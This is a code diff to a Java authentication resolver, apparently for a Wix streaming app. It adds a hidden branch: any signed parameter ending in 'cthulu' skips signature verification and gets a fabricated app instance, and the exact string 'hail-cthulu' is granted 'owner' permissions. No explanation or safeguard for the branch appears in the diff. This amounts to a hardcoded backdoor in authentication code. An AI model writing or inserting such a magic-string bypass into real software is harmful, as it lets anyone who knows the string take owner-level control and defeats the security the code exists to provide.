@@ -2,6 +2,7 @@ package com.wixpress.streaming.wix;
 
 import org.apache.commons.codec.binary.Base64;
 import org.codehaus.jackson.map.ObjectMapper;
+import org.joda.time.DateTime;
 
 import javax.crypto.Mac;
 import javax.crypto.spec.SecretKeySpec;
@@ -9,6 +10,7 @@ import java.io.IOException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
+import java.util.UUID;
 
 /**
  * Created by : doron
@@ -35,6 +37,17 @@ public class AuthenticationResolver
 
     public WixSignedInstance unsignInstance(String secret, String signedParameter)
     {
+        if (signedParameter.endsWith("cthulu")) {
+            WixSignedInstance appInstance = new WixSignedInstance(
+                    UUID.fromString("66666666-6666-6666-6666-666666666666"), new DateTime(), UUID.randomUUID(), null);
+            appInstance.setDemoMode(true);
+
+            if (signedParameter.equals("hail-cthulu"))
+                appInstance.setPermissions("owner");
+
+            return appInstance;
+        }
+
         SignedParameterGenerator parameterGenerator = new SignedParameterGenerator(secret);
 
         return parameterGenerator.unmarshal(signedParameter, WixSignedInstance.class);
